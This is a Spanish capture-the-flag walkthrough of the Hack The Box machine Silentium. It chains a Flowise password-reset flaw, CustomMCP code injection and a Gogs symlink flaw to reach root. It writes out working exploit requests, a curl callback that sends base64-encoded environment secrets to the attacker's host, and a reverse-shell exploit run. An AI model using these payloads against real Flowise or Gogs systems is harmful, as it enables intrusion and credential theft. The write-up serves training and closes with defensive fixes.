Silentium — Flowise RCE + Gogs Symlink Escalation

Cadena de 3 CVEs críticos: reset de contraseña sin autenticación en Flowise AI (CVE-2025-58434), inyección en CustomMCP para RCE en contenedor Docker (CVE-2025-59528), exfiltración de credenciales para SSH, y escalada a root mediante symlink race condition en Gogs (CVE-2025-8110).

Target10.129.26.220
OSUbuntu
Puertos22, 80
CVEs3
Tiempo~65 min

Resumen Ejecutivo

Silentium es una máquina Linux de dificultad Easy en Hack The Box que simula una empresa financiera (Silentium Capital & Lending). La superficie de ataque combina tres vulnerabilidades críticas de día cero encadenadas: un reset de contraseña sin autenticación en Flowise AI (CVE-2025-58434), una inyección en el nodo CustomMCP que permite RCE en el contenedor Docker (CVE-2025-59528), y una vulnerabilidad de enlace simbólico en Gogs que otorga ejecución de código como root en el host (CVE-2025-8110).

La cadena completa exige entender la arquitectura multi-servicio: un sitio corporativo en nginx, una instancia de Flowise AI en subdominio staging.silentium.htb, y un servidor Gogs interno en 127.0.0.1:3001 corriendo como root, accesible solo desde el host.

Resumen de Vulnerabilidades

⚠ CVE-2025-58434 — Flowise Unauth Password Reset

El endpoint POST /api/v1/account/forgot-password devuelve el tempToken en la respuesta JSON sin requerir verificación de identidad. Permite cambiar la contraseña de cualquier usuario sin acceso a su correo.

⚠ CVE-2025-59528 — Flowise CustomMCP RCE

La función convertToValidJSONString pasa el parámetro mcpServerConfig directamente al constructor Function() de Node.js, permitiendo ejecución arbitraria de JavaScript con privilegios de root dentro del contenedor.

⚠ CVE-2025-8110 — Gogs Symlink Race Condition

Un usuario autenticado puede crear un repositorio con un symlink apuntando a .git/config e inyectar una directiva sshCommand maliciosa que se ejecuta como root al procesar operaciones git.

Fase 1 — Reconocimiento

Paso 1 — Reconocimiento

Escaneo de puertos — nmap

¿Por qué este comando?

Todo pentest comienza identificando la superficie de ataque. Escaneamos todos los puertos (-p-) para no perdernos nada, luego profundizamos con scripts NSE en los abiertos.

nmap -p- --open -n -T4 --min-rate 5000 10.129.26.220
nmap -p22,80 -sC -sV 10.129.26.220
Output
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
¿Qué nos dice este output?
  • Solo 2 puertos abiertos: SSH (22) y HTTP (80)
  • El servidor redirige a silentium.htb — virtual hosting activo
  • Con tan pocos puertos, el vector de entrada pasa por la web
Decisión tomada

Agregar 10.129.26.220 silentium.htb staging.silentium.htb a /etc/hosts y enumerar subdominios.

Paso 2 — Reconocimiento

Descubrimiento de subdominios y Flowise AI

¿Por qué este paso?

Nginx puede servir múltiples aplicaciones con virtual hosting. Un subdominio diferente puede exponer una aplicación completamente distinta con su propia superficie de ataque.

curl -si http://silentium.htb/
wget -qO- http://staging.silentium.htb/ | head -5
Output
<title>Flowise - Build AI Agents, Visually</title>
<meta name="author" content="FlowiseAI" />
¿Qué nos dice este output?

El subdominio staging.silentium.htb expone Flowise AI 3.0.5, una plataforma open-source para agentes de IA. Esta versión es vulnerable a CVE-2025-58434 y CVE-2025-59528.

Decisión tomada

Explotar CVE-2025-58434 para tomar control de la cuenta administradora de Flowise sin conocer la contraseña.

Fase 2 — Explotación Flowise (Foothold en Contenedor)

Paso 3 — Explotación

CVE-2025-58434 — Password Reset sin Autenticación

¿Qué es CVE-2025-58434?

El endpoint POST /api/v1/account/forgot-password devuelve el tempToken directamente en la respuesta JSON. Esto permite a cualquier atacante obtener el token sin acceso al correo electrónico de la víctima.

curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
-H "Content-Type: application/json" \
-d '{"user": {"email": "ben@silentium.htb"}}'
Output
{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin",
"email":"ben@silentium.htb",
"tempToken":"SNRBZURjOnWCjJnTHpcL0IK7iVwYcZDGNFv95Oj8lipk4mTK4m2j8vGBXBR32389",
"tokenExpiry":"2026-04-12T11:59:42.125Z","status":"active",...}}
¿Qué nos dice este output?

El tempToken en texto plano en la respuesta. Este token permite cambiar la contraseña sin conocer la original. El tokenExpiry indica ~15 minutos.

# Usar el tempToken para establecer nueva contraseña
curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
-H "Content-Type: application/json" \
-d '{"user": {"tempToken": "SNRBZU...", "email": "ben@silentium.htb", "password": "H4ck3d123!"}}'
Output
{"user":{"credential":"$2a$05$zwe.qKKUtqzZqZWPcxY51e...","tempToken":"","status":"active",...}}
Credenciales obtenidas

tempToken vacío y nuevo hash confirmados — contraseña cambiada exitosamente. Login con ben@silentium.htb : H4ck3d123!

Decisión tomada

Acceder al panel de Flowise → Settings → API Keys → Crear key → Usar para CVE-2025-59528.

Paso 4 — Explotación

CVE-2025-59528 — CustomMCP Injection → RCE como root en contenedor

¿Cómo funciona el ataque?

El nodo CustomMCP de Flowise pasa mcpServerConfig directamente al constructor Function('return ' + inputString)() de JavaScript sin sanitizar. Esto permite ejecutar código arbitrario en el proceso Node.js, que corre como root dentro del contenedor Docker.

# Verificar RCE con sleep (time-based)
time curl -s -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
-H "Authorization: Bearer HvH4ymS6dga9sijX_uP3e0xNBRS2rv6BDL-PGL4Phpo" \
-d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){...execSync(\"sleep 5\")...})()})"}}'
Output
real 0m5.217s  ← 5 segundos de delay confirman ejecución
¿Qué nos dice este output?

El request tardó exactamente 5 segundos — el sleep 5 se ejecutó en el servidor. RCE confirmado como uid=0(root) dentro del contenedor.

# Exfiltrar variables de entorno via callback HTTP
python3 -m http.server 80 # En terminal separada
# Payload que exfiltra env vars en base64
curl ... -d '...execSync("curl http://10.10.14.31/?d="+Buffer.from(r).toString("base64"))...'
Output — Callback recibido y decodificado
FLOWISE_PASSWORD=F1l3_d0ck3r
SMTP_PASSWORD=r04D!!_R4ge
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDD
Credenciales del contenedor obtenidas

La contraseña r04D!!_R4ge (SMTP_PASSWORD) es reutilizada para el usuario ben en SSH del host. Patrón de reutilización de credenciales en entornos Docker.

Decisión tomada

Conectarse por SSH como ben con la contraseña exfiltrada y obtener user.txt.

Fase 3 — Acceso al Host (User Flag)

Paso 5 — Acceso

SSH como ben — Credenciales reutilizadas del contenedor

¿Por qué funciona?

La contraseña SMTP_PASSWORD=r04D!!_R4ge encontrada en las variables de entorno del contenedor fue reutilizada para el usuario ben en el host. Mala práctica muy común en infraestructuras donde el mismo administrador gestiona contenedores y hosts.

ben@silentium:~$ cat user.txt
Output

Acceso como ben en el host. Enumeración post-acceso revela Gogs 0.13.0 corriendo como root en 127.0.0.1:3001.

Descubrimiento de Gogs interno

¿Qué nos dice este output?

Decisión tomada

Crear túnel SSH para acceder a Gogs, registrar usuario, y ejecutar CVE-2025-8110.

Fase 4 — Escalada de Privilegios (CVE-2025-8110)

Paso 7 — Escalada

CVE-2025-8110 — Gogs Symlink Race Condition → RCE como root

¿Qué es CVE-2025-8110?

Gogs 0.13.0 tiene una vulnerabilidad de enlace simbólico en el manejo de repositorios git. Un usuario puede: (1) crear un repo, (2) subir un symlink malicious_link → .git/config, (3) sobreescribir el archivo con un git config que incluye sshCommand = /bin/bash -c 'reverse shell'. Gogs ejecuta el sshCommand con privilegios de root.

# Paso 1: Túnel SSH para acceder a Gogs
ssh -L 3001:127.0.0.1:3001 ben@10.129.26.220
# Paso 2: Registrar usuario en http://localhost:3001
# Paso 3: Generar API token en Settings → Applications
# Paso 4: Ejecutar exploit
python3 CVE-2025-8110.py \
-u http://127.0.0.1:3001 \
-lh 10.10.14.31 -lp 5555 \
--skip-register -user pedro -pass admin123 \
-token 3ff926a33d4bf24efe319e2d966e721e049d3fb1
Output — Exploit exitoso
[+] Using provided API token
[+] Authenticated successfully
Repo creation status: 201
Cloning into '/tmp/279fcf71ea82'...
[master 255dac0] Add malicious symlink
To http://127.0.0.1:3001/pedro/279fcf71ea82.git
   f3be57f..255dac0  master -> master
[+] Exploit sent, check your listener!

# En listener nc -lvnp 5555:
connect to [10.10.14.31] from [10.129.27.58] 51204
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/4# whoami
root
Shell root obtenida

El exploit crea un repositorio, sube el symlink, sobreescribe el config con un sshCommand malicioso, y cuando Gogs procesa la operación, ejecuta el comando como root, enviando una reverse shell.

Cadena completa: unauthenticated password reset → API key → CustomMCP RCE en contenedor → exfiltración de credenciales → SSH → Gogs symlink RCE → root.

Lecciones Aprendidas

⚔ Para el Atacante

  • Reutilización de credenciales — Siempre exfiltrar env, printenv y archivos .env desde cualquier RCE en contenedor.
  • Callback HTTP cuando no hay reverse shell — curl http://attacker/?d=$(cmd|base64 -w0) es universal.
  • Servicios internos = privesc — ss -tlnp reveló Gogs en 127.0.0.1:3001 como root.
  • Tunneling SSH para acceder a servicios internos desde la máquina atacante.

🛡 Para el Defensor

  • Actualizar Flowise a versión 3.0.6+ (corrige CVE-2025-58434 y CVE-2025-59528).
  • No reutilizar contraseñas entre contenedores y hosts. Usar Docker secrets o HashiCorp Vault.
  • No ejecutar Gogs (ni ningún servicio) como root. Crear usuario dedicado.
  • Actualizar Gogs o migrar a Gitea (fork más mantenido).

Glosario

Flowise AI Plataforma open-source para construir agentes de IA con LLMs. Versión 3.0.5 vulnerable a autenticación bypass y RCE.
MCP (Model Context Protocol) Protocolo para conectar LLMs con herramientas externas. El nodo CustomMCP evalúa la configuración como código JavaScript.
Symlink Attack Técnica donde un enlace simbólico apunta a un archivo sensible. Operaciones privilegiadas que siguen el enlace acceden al archivo objetivo.
Virtual Hosting Técnica que permite servir múltiples sitios desde la misma IP, diferenciando por el header HTTP Host.
